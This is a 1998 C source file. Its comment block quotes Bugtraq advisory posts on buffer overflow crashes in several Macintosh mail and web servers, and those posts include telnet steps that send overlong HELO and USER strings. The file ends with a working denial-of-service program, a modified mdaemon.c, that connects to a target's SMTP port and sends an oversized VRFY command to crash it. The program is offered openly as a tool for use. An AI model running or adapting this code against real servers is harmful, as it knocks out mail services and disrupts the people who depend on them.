/*
Overflows in various Macintosh mail clients.

Summary
Description:	Standard overflows.
Author:	Chris Wedgwood <chris@CYBERNET.CO.NZ>
Compromise:	DOS attack at least, there is at least a possibility of remote code execution (I've never seen this done on a Mac though).
Vulnerable Systems:	Macintosh boxes running Stalker Internet Mail Server V.1.6 or AppleShare IP Mail Server 5.0.3 SMTP Server
Date:	8 April 1998
Details


Date: Wed, 8 Apr 1998 13:11:17 +1200
From: Chris Wedgwood <chris@CYBERNET.CO.NZ>
To: BUGTRAQ@NETSPACE.ORG
Subject: AppleShare IP Mail Server

[Yet another buffer overrun? - I hope this isn't getting monotonous]

I noticed this a while back but haven't seen any else mention it.


There appears to be what looks like a buffer overrun problem with AppleShare
IP Mail Server.

If you connect to the SMTP port and issue a long string (say 500 bytes or
so) the server crashes - and because its a Mac, it usually crashed the whole
machine to the point where it needs a reboot.

So far I've only tested against servers which emit the banner 'AppleShare IP
Mail Server 5.0.3'

For example:


$ telnet some.where
Trying 1.2.3.4...
Connected to some.where.
Escape character is '^]'.
220 some.where AppleShare IP Mail Server 5.0.3 SMTP Server Ready
HELO XXXXXXXXXXX[....several hundered of these....]XXXXXXXX
[ and it just hangs ]

$ ping some.where
[ ...nothing... ]


Physically checking the machine shows it has `locked up' and it a reboot. I
assume if you can cause a crash without the lockup then you might be able to
execute code and so something useful (on a Mac?).




-cw
Date: Wed, 8 Apr 1998 12:34:09 +0800
From: David Luyer <luyer@UCS.UWA.EDU.AU>
To: BUGTRAQ@NETSPACE.ORG
Subject: Re: AppleShare IP Mail Server

Chris Wedgewood wrote:

> 220 some.where AppleShare IP Mail Server 5.0.3 SMTP Server Ready
> HELO XXXXXXXXXXX[....several hundered of these....]XXXXXXXX
> [ and it just hangs ]

Same with

220-Stalker Internet Mail Server V.1.6 is ready.
220 ESMTP is spoken here.
HELO xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
[dead]

But then, isn't that expected of using toy machines (Macs/Win PCs) for servers?

David.

Date: Tue, 14 Apr 1998 10:01:05 -0400 (EDT)
From: Netstat Webmaster 
Subject: MacOS based buffer overflows...


Eudora Internet Mail Server vs. 1.2, 2.0, 2.01 DoS

Telnet to port 106 of an EIMS server.
Type USER xxxxxxxxxxxx(at least a 1000+ char string).  EIMS will crash.
Occasionally taking the entire machine with it.

---

Apple's Web Sharing DoS

Telnet to port 80 of a Web Sharing server (built into system 8.0+).
Upon connect enter any string of at least 3000+ characters.  Hit return
twice, Web Sharing will stop servicing.  It does not seem to make the
server any less stable and Web Sharing seems to be able to be restarted
with out a reboot and without any ill effects.

Phanty.

Date: Wed, 8 Apr 1998 07:10:25 -0400
From: Jon Beaton <steven@EFNI.COM>
To: BUGTRAQ@NETSPACE.ORG
Subject: smtp overflows

There have been more posts about the buffer overflows on smtp daemons, so I thought this may be useful. After posting about these attacks on SLMail and Imail, I found that there were alot more that were still affected. On the few I've tried on the Mac, like Mercury, it had locked the server up, much like Appleshare. Anyways, this is just mdaemon.c with just a few tiny changes, just thought it may be useful. Btw, I just wanted to note that this will also crash IMail, even though the author has said it wasn't affected.

Jon
*/

/*
mdaemon.c with a few small changes.
known to lock up the whole server with some daemons on the Mac

Cisc0 @ Undernet
*/

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void main(int argc, char *argv[])
{
	struct sockaddr_in sin;
	struct hostent *hp;
	char *buffer;
	int sock, i;

	if (argc != 2) {
		printf("usage: %s <smtp server>\n", argv[0]);
	     exit(1);
	}
	hp = gethostbyname(argv[1]);
	if (hp==NULL) {
		printf("Unknown host: %s\n",argv[1]);
		exit(1);
	}
	bzero((char*) &sin, sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length); sin.sin_family = hp->h_addrtype;
	sin.sin_port = htons(25);
	sock = socket(AF_INET, SOCK_STREAM, 0); connect(sock,(struct sockaddr *) &sin, sizeof(sin)); buffer = (char *)malloc(1000);
	sprintf(buffer, "VRFY ");
	for (i = 0; i<896; i++)
		strcat(buffer, "d");
	strcat(buffer, "\r\n");
	write(sock, &buffer[0], strlen(buffer)); close(sock);
	free(buffer);
}
